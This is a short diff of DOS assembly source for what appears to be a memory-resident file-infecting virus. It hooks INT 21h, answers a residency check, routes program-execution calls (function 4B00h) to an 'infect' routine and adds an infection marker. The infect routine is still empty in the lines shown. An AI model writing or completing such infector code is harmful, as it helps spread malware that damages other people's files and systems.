@@ -46,9 +46,11 @@ new_int21:
      mov bp, ax             ; BP = file delta offset
      pop ax
 .what_func:
-     cmp ax, 9a8ah
+     cmp ax, 9a8ah        ; Loaded?
      je send_msg          ; Report that we are in memory
-     cmp ax, 4b00h
+     cmp ax, 4b00h        ; Load and Execute (Exec), function 0
+     je infect            ; On entry: DS:DX = ASCIIZ filename pointer
+
 
 .call_int21:
      jmp short goto_int21
@@ -57,5 +59,13 @@ new_int21:
 
 goto_int21: db 0EAh, 00h, 00h, 00h, 00h   ; Jump far, absolute, address given in operand
 
+send_msg:
+      mov ax, 8b7bh     ; In Mem Signature
+      iret
+
+infect:            ; DS:DX = ASCIIZ Filename pointer
+      
+
 data_section:
      .save_bp dw 0
+     .file_infected db 'Weep'
